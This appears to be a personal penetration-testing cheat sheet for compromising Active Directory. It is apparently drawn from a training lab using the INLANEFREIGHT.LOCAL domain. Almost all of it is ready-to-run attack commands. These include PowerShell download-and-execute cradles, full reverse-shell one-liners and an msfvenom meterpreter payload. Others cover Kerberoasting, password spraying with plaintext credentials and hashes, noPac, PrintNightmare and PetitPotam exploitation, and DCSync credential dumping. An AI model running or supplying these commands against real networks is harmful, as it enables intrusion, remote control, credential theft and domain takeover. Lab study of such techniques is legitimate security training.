# aaaxxqqq

https://www.thehacker.recipes/ad/movement/kerberos/asreproast

Rubeus ->  https://github.com/GhostPack/Rubeus


Metasploit
https://www.offsec.com/metasploit-unleashed/msfvenom/
https://www.beyondtrust.com/blog/entry/how-to-use-metasploit-for-command-control
https://github.com/lexisrepo/Shells
https://0xdf.gitlab.io/2022/07/16/htb-acute.html

iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.244/ps.ps1'))
IEX([Net.Webclient]::new().DownloadString($url))
https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1



$client = New-Object System.Net.Sockets.TCPClient('10.10.50.101',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
$sm=(New-Object Net.Sockets.TCPClient('10.10.50.101',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}



sharphound
https://github.com/SpecterOps/SharpHound
bloodhound -> 


impacket
https://github.com/fortra/impacket

[
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1)
shell
powershell.exe Invoke-WebRequest -Uri "http://10.10.15.253:8000/PowerView.ps1" -OutFile “C:\PowerView.ps1"

Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
Get-DomainUser -Identity svc_sql -SPN | Get-DomainSPNTicket –Format Hashcat | Out-File .\svc_sql_tgs_hash.txt

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request


username-passs
$username = "inlanefreight\svc_sql"
$password = "lucky7"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $securePassword)


arp -a 
fping

portfwd add -l 7878 -p 445 -r 172.16.6.50

Mimikatz
https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe


runas /netonly /user:INLANEFREIGHT\tpetty powershell


run autoroute -s 172.16.6.3/16



$sid = Convert-NameToSid username
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}






sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

### User enum
rpcclient -U "" -N 172.16.5.5 -> queryuser 0x457 -> enumdomusers
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
crackmapexec smb 172.16.5.5 --users
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

#### Brute users
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
https://github.com/insidetrust/statistically-likely-usernames
sudo crackmapexec smb 172.16.5.5 -u user -p pass --users

### Spray pass
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
VALIDATE -> sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
local -> sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

### Pass policy
rpclient -U "" -N X.X.X.X
querydominfo
getdompwinfo
enum4linux -P 172.16.5.5
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength


### Responder
sudo responder -I interface
sudo responder -I interface -A (OBSERVATION MODE)

### enum
sudo nmap -v -A -iL hosts.txt -oN 
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users


### nopac
https://github.com/Ridter/noPac
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator


### printnightmare
https://github.com/cube0x0/CVE-2021-1675.git
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR' 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll (share a share on our host)
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

### petitpotam
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
python3 PetitPotam.py 172.16.5.225 172.16.5.5       
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba


ALTERNATIVE
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
klist
mimikatz
lsadump::dcsync /user:inlanefreight\krbtgt



